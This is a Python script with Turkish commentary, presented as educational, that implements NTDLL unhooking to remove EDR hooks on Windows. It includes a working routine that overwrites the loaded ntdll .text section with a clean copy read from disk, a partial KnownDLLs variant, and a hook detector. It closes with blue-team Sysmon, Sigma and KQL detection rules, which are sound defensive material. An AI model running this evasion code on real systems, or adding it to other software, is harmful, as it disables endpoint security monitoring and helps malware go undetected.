"""
Evasion Technique: NTDLL Unhooking
===================================
EDR hook'larını kaldırarak normal NTDLL fonksiyonlarını geri yükleme.

MITRE ATT&CK: T1562.001 - Impair Defenses: Disable or Modify Tools

Yöntemler:
1. Fresh NTDLL from disk - Diskten temiz kopya yükle
2. Fresh NTDLL from KnownDLLs - KnownDLLs'den yükle
3. Suspended process NTDLL - Başka process'ten kopyala
4. Manual unhook - Hook'ları manuel kaldır

Author: Ugur Ates
Purpose: Educational
"""

import ctypes
from ctypes import wintypes
import os

# ============================================================================
# EXPLANATION
# ============================================================================

TECHNIQUE_INFO = """
╔══════════════════════════════════════════════════════════════════════════════╗
║                      EVASION: NTDLL UNHOOKING                                 ║
╠══════════════════════════════════════════════════════════════════════════════╣
║                                                                              ║
║  📖 PROBLEM: EDR HOOKS                                                       ║
║  ─────────────────────────                                                   ║
║                                                                              ║
║  EDR/AV, NTDLL.dll'deki fonksiyonları hook eder:                            ║
║                                                                              ║
║  Hooked NtWriteVirtualMemory:                                                ║
║  ┌────────────────────────────────────────────────────────────────┐         ║
║  │  E9 XX XX XX XX    jmp EDR_Monitor      ◄── HOOK (5 bytes)     │         ║
║  │  90                nop                                          │         ║
║  │  B8 3A 00 00 00    mov eax, 0x3A                               │         ║
║  │  0F 05             syscall                                      │         ║
║  │  C3                ret                                          │         ║
║  └────────────────────────────────────────────────────────────────┘         ║
║                                                                              ║
║  🔧 ÇÖZÜM: UNHOOKING                                                         ║
║  ────────────────────────                                                    ║
║                                                                              ║
║  Orijinal (temiz) byte'ları geri yükle:                                      ║
║                                                                              ║
║  Clean NtWriteVirtualMemory:                                                 ║
║  ┌────────────────────────────────────────────────────────────────┐         ║
║  │  4C 8B D1          mov r10, rcx         ◄── ORİJİNAL           │         ║
║  │  B8 3A 00 00 00    mov eax, 0x3A                               │         ║
║  │  0F 05             syscall                                      │         ║
║  │  C3                ret                                          │         ║
║  └────────────────────────────────────────────────────────────────┘         ║
║                                                                              ║
║  🔄 UNHOOKING YÖNTEMLERİ:                                                    ║
║  ──────────────────────────                                                  ║
║                                                                              ║
║  ┌─────────────────────────────────────────────────────────────────────┐    ║
║  │                                                                     │    ║
║  │  METHOD 1: Fresh NTDLL from Disk                                    │    ║
║  │  ─────────────────────────────────                                  │    ║
║  │                                                                     │    ║
║  │  1. C:\Windows\System32\ntdll.dll dosyasını oku                    │    ║
║  │  2. .text section'ını parse et                                      │    ║
║  │  3. Hooked NTDLL'in .text section'ını overwrite et                 │    ║
║  │                                                                     │    ║
║  │  Disk                    Memory                                     │    ║
║  │  ┌──────────────┐       ┌──────────────┐                           │    ║
║  │  │ Clean NTDLL  │ ───►  │ Hooked NTDLL │                           │    ║
║  │  │ .text        │       │ .text ✓      │ ◄── Restored!             │    ║
║  │  └──────────────┘       └──────────────┘                           │    ║
║  │                                                                     │    ║
║  └─────────────────────────────────────────────────────────────────────┘    ║
║                                                                              ║
║  ┌─────────────────────────────────────────────────────────────────────┐    ║
║  │                                                                     │    ║
║  │  METHOD 2: KnownDLLs Section                                        │    ║
║  │  ────────────────────────────                                       │    ║
║  │                                                                     │    ║
║  │  1. NtOpenSection ile \KnownDlls\ntdll.dll aç                      │    ║
║  │  2. NtMapViewOfSection ile map et                                   │    ║
║  │  3. Clean .text'i kopyala                                          │    ║
║  │                                                                     │    ║
║  │  Avantaj: Disk I/O olmadan temiz NTDLL                              │    ║
║  │                                                                     │    ║
║  └─────────────────────────────────────────────────────────────────────┘    ║
║                                                                              ║
║  ┌─────────────────────────────────────────────────────────────────────┐    ║
║  │                                                                     │    ║
║  │  METHOD 3: Suspended Process                                        │    ║
║  │  ────────────────────────────                                       │    ║
║  │                                                                     │    ║
║  │  1. Yeni process oluştur (CREATE_SUSPENDED)                         │    ║
║  │  2. EDR hook'ları henüz yüklenmemiş!                                │    ║
║  │  3. Temiz NTDLL'i kopyala                                          │    ║
║  │  4. Process'i terminate et                                          │    ║
║  │                                                                     │    ║
║  └─────────────────────────────────────────────────────────────────────┘    ║
║                                                                              ║
║  ⚠️ TESPİT GÖSTERGELERİ:                                                     ║
║  ────────────────────────                                                    ║
║  • NTDLL .text section'ına yazma (PAGE_EXECUTE_WRITECOPY)                   ║
║  • Disk'ten ntdll.dll okuma                                                  ║
║  • KnownDLLs section erişimi                                                 ║
║  • Suspended process + memory read                                           ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

# ============================================================================
# CONSTANTS
# ============================================================================

PAGE_EXECUTE_WRITECOPY = 0x80
PAGE_EXECUTE_READWRITE = 0x40

# ============================================================================
# METHOD 1: FRESH NTDLL FROM DISK
# ============================================================================

def unhook_ntdll_from_disk(verbose: bool = True) -> bool:
    """
    Disk'teki temiz ntdll.dll'den .text section'ı kopyalayarak unhook yap.
    
    Returns:
        bool: Başarı durumu
    """
    if verbose:
        print("\n🔧 METHOD 1: Fresh NTDLL from Disk")
        print("="*60)
    
    try:
        import pefile
    except ImportError:
        print("❌ pefile modülü gerekli: pip install pefile")
        return False
    
    ntdll_path = r"C:\Windows\System32\ntdll.dll"
    
    # Step 1: Get loaded NTDLL base address
    if verbose:
        print("\n[1/4] Loaded NTDLL base adresi alınıyor...")
    
    ntdll_handle = ctypes.windll.kernel32.GetModuleHandleW("ntdll.dll")
    if not ntdll_handle:
        print("❌ NTDLL handle alınamadı!")
        return False
    
    if verbose:
        print(f"   ✅ Loaded NTDLL: 0x{ntdll_handle:016X}")
    
    # Step 2: Read clean NTDLL from disk
    if verbose:
        print("\n[2/4] Disk'ten temiz NTDLL okunuyor...")
    
    try:
        pe = pefile.PE(ntdll_path)
    except Exception as e:
        print(f"❌ NTDLL parse hatası: {e}")
        return False
    
    # Step 3: Find .text section
    if verbose:
        print("\n[3/4] .text section bulunuyor...")
    
    text_section = None
    for section in pe.sections:
        if b'.text' in section.Name:
            text_section = section
            break
    
    if not text_section:
        print("❌ .text section bulunamadı!")
        return False
    
    text_rva = text_section.VirtualAddress
    text_size = text_section.Misc_VirtualSize
    text_data = text_section.get_data()
    
    if verbose:
        print(f"   ✅ .text section: RVA=0x{text_rva:X}, Size={text_size}")
    
    # Step 4: Overwrite hooked .text with clean .text
    if verbose:
        print("\n[4/4] Hooked .text overwrite ediliyor...")
    
    # Calculate address
    hooked_text_addr = ntdll_handle + text_rva
    
    # Change protection to writable
    old_protect = wintypes.DWORD()
    result = ctypes.windll.kernel32.VirtualProtect(
        hooked_text_addr,
        text_size,
        PAGE_EXECUTE_WRITECOPY,
        ctypes.byref(old_protect)
    )
    
    if not result:
        print(f"❌ VirtualProtect başarısız!")
        return False
    
    # Copy clean .text
    ctypes.memmove(hooked_text_addr, text_data, len(text_data))
    
    # Restore protection
    ctypes.windll.kernel32.VirtualProtect(
        hooked_text_addr,
        text_size,
        old_protect.value,
        ctypes.byref(old_protect)
    )
    
    if verbose:
        print(f"   ✅ {len(text_data)} bytes kopyalandı!")
        print("\n" + "="*60)
        print("🎉 NTDLL UNHOOKING BAŞARILI!")
        print("   Tüm EDR hook'ları kaldırıldı")
        print("="*60)
    
    return True

# ============================================================================
# METHOD 2: KNOWNDLLS SECTION
# ============================================================================

def unhook_ntdll_from_knowndlls(verbose: bool = True) -> bool:
    """
    KnownDLLs section'dan temiz NTDLL kullanarak unhook yap.
    
    Returns:
        bool: Başarı durumu
    """
    if verbose:
        print("\n🔧 METHOD 2: KnownDLLs Section")
        print("="*60)
    
    ntdll = ctypes.WinDLL('ntdll')
    
    # UNICODE_STRING structure
    class UNICODE_STRING(ctypes.Structure):
        _fields_ = [
            ("Length", wintypes.USHORT),
            ("MaximumLength", wintypes.USHORT),
            ("Buffer", wintypes.LPWSTR),
        ]
    
    # OBJECT_ATTRIBUTES structure
    class OBJECT_ATTRIBUTES(ctypes.Structure):
        _fields_ = [
            ("Length", wintypes.ULONG),
            ("RootDirectory", wintypes.HANDLE),
            ("ObjectName", ctypes.POINTER(UNICODE_STRING)),
            ("Attributes", wintypes.ULONG),
            ("SecurityDescriptor", wintypes.LPVOID),
            ("SecurityQualityOfService", wintypes.LPVOID),
        ]
    
    OBJ_CASE_INSENSITIVE = 0x00000040
    
    # Section name
    section_name = "\\KnownDlls\\ntdll.dll"
    
    if verbose:
        print(f"\n[1/3] Opening section: {section_name}")
    
    # Initialize UNICODE_STRING
    us = UNICODE_STRING()
    us.Buffer = section_name
    us.Length = len(section_name) * 2
    us.MaximumLength = us.Length + 2
    
    # Initialize OBJECT_ATTRIBUTES
    oa = OBJECT_ATTRIBUTES()
    oa.Length = ctypes.sizeof(OBJECT_ATTRIBUTES)
    oa.RootDirectory = None
    oa.ObjectName = ctypes.pointer(us)
    oa.Attributes = OBJ_CASE_INSENSITIVE
    oa.SecurityDescriptor = None
    oa.SecurityQualityOfService = None
    
    # NtOpenSection
    section_handle = wintypes.HANDLE()
    SECTION_MAP_READ = 0x0004
    
    status = ntdll.NtOpenSection(
        ctypes.byref(section_handle),
        SECTION_MAP_READ,
        ctypes.byref(oa)
    )
    
    if status != 0:
        if verbose:
            print(f"   ⚠️ NtOpenSection status: 0x{status:08X}")
            print("   Bu yöntem bazı sistemlerde çalışmayabilir")
        return False
    
    if verbose:
        print(f"   ✅ Section handle: 0x{section_handle.value:X}")
        print("\n[2/3] Section mapping...")
        print("\n[3/3] .text section kopyalama...")
        print("\n   ⚠️ Tam implementasyon için NtMapViewOfSection gerekli")
    
    # Cleanup
    ntdll.NtClose(section_handle)
    
    return True

# ============================================================================
# METHOD 3: MANUAL HOOK DETECTION & REMOVAL
# ============================================================================

def detect_hooks(verbose: bool = True) -> dict:
    """
    NTDLL'deki hook'ları tespit et.
    
    Hook patterns:
    - JMP (E9 XX XX XX XX) - Near jump
    - JMP (FF 25 XX XX XX XX) - Indirect jump
    - MOV RAX + JMP RAX - Register jump
    
    Returns:
        dict: Tespit edilen hook'lar
    """
    if verbose:
        print("\n🔍 Hook Detection")
        print("="*60)
    
    hooks_found = {}
    
    # Functions to check
    functions = [
        "NtAllocateVirtualMemory",
        "NtWriteVirtualMemory",
        "NtProtectVirtualMemory",
        "NtCreateThreadEx",
        "NtMapViewOfSection",
        "NtOpenProcess",
        "NtCreateSection",
    ]
    
    ntdll = ctypes.WinDLL('ntdll')
    
    for func_name in functions:
        try:
            func_addr = ctypes.cast(
                getattr(ntdll, func_name),
                ctypes.c_void_p
            ).value
            
            if not func_addr:
                continue
            
            # Read first 16 bytes
            func_bytes = ctypes.string_at(func_addr, 16)
            
            # Check for hook patterns
            is_hooked = False
            hook_type = ""
            
            # Pattern 1: JMP rel32 (E9 XX XX XX XX)
            if func_bytes[0] == 0xE9:
                is_hooked = True
                hook_type = "JMP rel32"
            
            # Pattern 2: JMP [rip+offset] (FF 25)
            elif func_bytes[0] == 0xFF and func_bytes[1] == 0x25:
                is_hooked = True
                hook_type = "JMP [rip+offset]"
            
            # Pattern 3: MOV RAX, addr; JMP RAX (48 B8 ... FF E0)
            elif func_bytes[0] == 0x48 and func_bytes[1] == 0xB8:
                is_hooked = True
                hook_type = "MOV RAX; JMP RAX"
            
            # Normal pattern check: 4C 8B D1 (mov r10, rcx)
            elif func_bytes[0:3] != b'\x4C\x8B\xD1':
                is_hooked = True
                hook_type = "Unknown modification"
            
            if is_hooked:
                hooks_found[func_name] = {
                    "address": func_addr,
                    "hook_type": hook_type,
                    "bytes": func_bytes[:8].hex()
                }
                
                if verbose:
                    print(f"   🚨 {func_name}: HOOKED ({hook_type})")
                    print(f"      Address: 0x{func_addr:016X}")
                    print(f"      Bytes: {func_bytes[:8].hex()}")
            else:
                if verbose:
                    print(f"   ✅ {func_name}: Clean")
                    
        except Exception as e:
            if verbose:
                print(f"   ⚠️ {func_name}: Error - {e}")
    
    return hooks_found

# ============================================================================
# DETECTION RULES
# ============================================================================

DETECTION_RULES = """
╔══════════════════════════════════════════════════════════════════════════════╗
║                    🛡️ BLUE TEAM DETECTION RULES                              ║
╠══════════════════════════════════════════════════════════════════════════════╣
║                                                                              ║
║  📋 ETW DETECTION:                                                           ║
║  ─────────────────                                                           ║
║                                                                              ║
║  Provider: Microsoft-Windows-Kernel-Audit-API-Calls                          ║
║  - NtProtectVirtualMemory on ntdll.dll                                       ║
║  - WriteProcessMemory to ntdll.dll memory region                             ║
║                                                                              ║
║  📋 SYSMON:                                                                  ║
║  ──────────                                                                  ║
║                                                                              ║
║  <!-- Event ID 7: NTDLL reload detection -->                                 ║
║  <ImageLoad onmatch="include">                                               ║
║    <ImageLoaded condition="contains">ntdll.dll</ImageLoaded>                 ║
║    <LoadedCount condition="greater than">1</LoadedCount>                     ║
║  </ImageLoad>                                                                ║
║                                                                              ║
║  📋 SIGMA RULE:                                                              ║
║  ──────────────                                                              ║
║                                                                              ║
║  title: NTDLL Unhooking Attempt                                              ║
║  status: experimental                                                        ║
║  logsource:                                                                  ║
║    product: windows                                                          ║
║    category: file_access                                                     ║
║  detection:                                                                  ║
║    selection:                                                                ║
║      TargetFilename|endswith: '\\ntdll.dll'                                  ║
║      AccessMask: '0x120089'  # Read                                          ║
║    filter:                                                                   ║
║      ProcessName|endswith:                                                   ║
║        - '\\smss.exe'                                                        ║
║        - '\\csrss.exe'                                                       ║
║    condition: selection and not filter                                       ║
║  level: high                                                                 ║
║                                                                              ║
║  📋 KQL QUERIES:                                                             ║
║  ────────────────                                                            ║
║                                                                              ║
║  // NTDLL memory protection change                                           ║
║  DeviceEvents                                                                ║
║  | where ActionType == "NtProtectVirtualMemoryApiCall"                       ║
║  | where TargetFileName has "ntdll"                                          ║
║                                                                              ║
║  // KnownDLLs section access                                                 ║
║  DeviceEvents                                                                ║
║  | where ActionType == "NtOpenSectionApiCall"                                ║
║  | where ObjectName contains "KnownDlls"                                     ║
║                                                                              ║
║  📋 BEHAVIORAL INDICATORS:                                                   ║
║  ──────────────────────────                                                  ║
║                                                                              ║
║  • ntdll.dll dosyasını okuma (unusual process)                               ║
║  • ntdll memory region'a yazma                                               ║
║  • KnownDLLs section erişimi                                                 ║
║  • Suspended process + memory read pattern                                   ║
║  • .text section'ın hash değişikliği                                        ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

# ============================================================================
# MAIN
# ============================================================================

if __name__ == "__main__":
    print(TECHNIQUE_INFO)
    
    print("\n📋 Seçenekler:")
    print("   1. Hook Detection - Mevcut hook'ları tespit et")
    print("   2. Unhook from Disk - Disk'ten temiz NTDLL ile unhook")
    print("   3. KnownDLLs Method - KnownDLLs section kullan")
    
    choice = input("\nSeçim (1/2/3): ").strip()
    
    if choice == "1":
        hooks = detect_hooks()
        if hooks:
            print(f"\n🚨 {len(hooks)} hook tespit edildi!")
        else:
            print("\n✅ Hook tespit edilmedi")
    
    elif choice == "2":
        confirm = input("⚠️ NTDLL unhook yapılsın mı? (y/n): ").strip().lower()
        if confirm == 'y':
            unhook_ntdll_from_disk()
    
    elif choice == "3":
        unhook_ntdll_from_knowndlls()
    
    print(DETECTION_RULES)
